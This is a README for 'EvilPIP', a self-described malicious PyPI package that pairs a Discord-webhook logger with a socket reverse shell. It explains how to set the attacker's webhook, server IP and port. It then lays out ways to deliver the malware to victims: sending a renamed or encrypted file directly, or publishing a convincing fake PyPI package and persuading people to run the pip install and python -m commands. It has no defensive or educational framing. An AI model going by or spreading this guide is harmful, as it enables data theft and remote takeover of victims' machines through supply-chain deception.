# EvilPIP 👿
**Malicious PyPi Package/Malware with Discord Logger and Socket Reverse Shell**

# Usage
Edit the VARIABLES class with your information

    In '__main__.py' only {
      set 'webhook' to your Discord webhook
      set 'REVSHELL' to False if you don't want the reverse shell
      set 'REVSHELL' to True if you want the reverse shell
    }
    In '__main__.py' and 'server.py' {
      Set 'serverip' to your host/VPS IP for the victim to connect to
      Set 'port' to the port you want the victim to connect to (optional)
      Set 'buffer' to the buffer size (in bytes) that you want to send (optional)
    }

If **REVSHELL** is enabled and you want the victim to connect to the reverse shell -

    Port-Forward on the port you had chosen (look up a tutorial for your router/VPS)


# Distribution methods

**If you set REVSHELL to True: Open 'server.py' on your own machine/VPS to wait for a reverse shell connection**

**Method 1: Sending file directly (only works if they have the dependencies)**
- Rename and encrypt (optional) the '__ main __.py' file
- Send the file to someone directly and wait for a connection
- When opened, evilpip should be executed

**Method 2: PyPi Package**
- Upload the package to PyPi and make it look convincing (requires experience)
- Get someone to run these commands (evilpip = your pypi package name):

      pip install evilpip
      python -m evilpip
